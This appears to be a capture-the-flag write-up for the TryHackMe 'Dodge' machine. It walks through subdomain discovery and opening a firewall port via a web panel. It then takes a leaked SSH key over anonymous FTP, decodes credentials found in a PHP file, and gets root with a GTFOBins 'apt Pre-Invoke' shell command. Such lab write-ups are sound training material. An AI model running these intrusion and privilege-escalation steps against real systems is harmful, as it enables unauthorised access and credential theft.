# TryHackMe Dodge Writeup

--- 

## Nmap scan

```
sudo nmap -sV -A Machine_ip 
```

```
Host is up (0.057s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE    VERSION
22/tcp  open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp  open  tcpwrapped
|http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp open  tcpwrapped
| tls-alpn: 
|  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dodge.thm/organizationName=Dodge Company, Inc./stateOrProvinceName=Tokyo/countryName=JP
| Subject Alternative Name: DNS:dodge.thm, DNS:www.dodge.thm, DNS:blog.dodge.thm, DNS:dev.dodge.thm, DNS:touch-me-not.dodge.thm, DNS:netops-dev.dodge.thm, DNS:ball.dodge.thm
| Not valid before: 2023-06-29T11:46:51
|_Not valid after:  2123-06-05T11:46:51
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host

TRACEROUTE (using port 22/tcp)
HOP RTT    ADDRESS
1   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.19 seconds
```

----

## when open website on port `443` we get **`403`**

<img width="1230" height="219" alt="image" src="https://github.com/user-attachments/assets/91d705e3-b2ad-495d-8dfd-1591d08fbcc1" />

## let write subdomains that we found in nmap result in **`/etc/hosts`**

<img width="696" height="58" alt="image" src="https://github.com/user-attachments/assets/27f9c1d4-dbb8-41ba-b2e9-d8d5a9a5e5a4" />

## when visit :

```
https://netops-dev.dodge.thm
```

> ## found white page go to source code found **`firewall.js`** file in it

<img width="1580" height="464" alt="image" src="https://github.com/user-attachments/assets/d2ac26c8-65d5-486f-8588-8aef285f08da" />

## open this endpoint 

```
https://netops-dev.dodge.thm/firewall10110.php
```

<img width="1347" height="767" alt="image" src="https://github.com/user-attachments/assets/fa85be5b-e105-427b-8937-908898bba379" />

```
sudo ufw allow 21
sudo ufw allow ftp
```

<img width="1442" height="708" alt="image" src="https://github.com/user-attachments/assets/e5dace90-86da-4502-96e5-7004c523bb2e" />

## now try to login with ftp with **`anonymous`**

```
ftp 10.128.158.93
```

> ## found **`user.txt`** but we don't have permissions got to **`.ssh`** directory and found **`id_ras_backup`** **`authorized_key`**

>  in **`authorized_key`** found username call **`challenger`**

```
get id_rsa_backup
chmod 600 id_rsa_backup
```

## connect to ssh 

```
ssh challenger@10.128.158.93 -i id_rsa_backup
```

<img width="1089" height="506" alt="image" src="https://github.com/user-attachments/assets/35e3c3dc-f51c-4f51-8335-292f4be25f6c" />

## now try read bash hishtory found that user try to edit php files so we go to `/var/www`

```
cat .bash_history
```

<img width="858" height="305" alt="image" src="https://github.com/user-attachments/assets/7ca39f9b-59e3-4ca8-a853-f37a15dc9ed5" />

```
cd /var/www
ls -la
cd /var/www/notes/api/
```

## found files **`notes.php`** found in it base64 

<img width="1457" height="318" alt="image" src="https://github.com/user-attachments/assets/67c16536-b4aa-475b-8414-c28dbdccfbf3" />

<img width="999" height="608" alt="image" src="https://github.com/user-attachments/assets/f75f7204-687f-4647-9dd2-9da0195efda0" />

## cobra password

```
cobra : mz4%o7BGum#TTu
```

## getting root 

```
sudo -l
```

<img width="1247" height="166" alt="image" src="https://github.com/user-attachments/assets/dfa964d2-062a-4e74-9cbf-0e464deda8d8" />

## [gtfobins](https://gtfobins.org/gtfobins/apt/)

<img width="1082" height="326" alt="image" src="https://github.com/user-attachments/assets/848eca92-7761-49ce-91c6-cfba6f2216d9" />

```
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```

<img width="1024" height="202" alt="image" src="https://github.com/user-attachments/assets/76e7288b-8ab2-4b25-8aec-cd06a6ce1e75" />

## system pwned

![MGIF](https://github.com/user-attachments/assets/cf381e21-7bd6-4ab1-8606-a51926c12272)

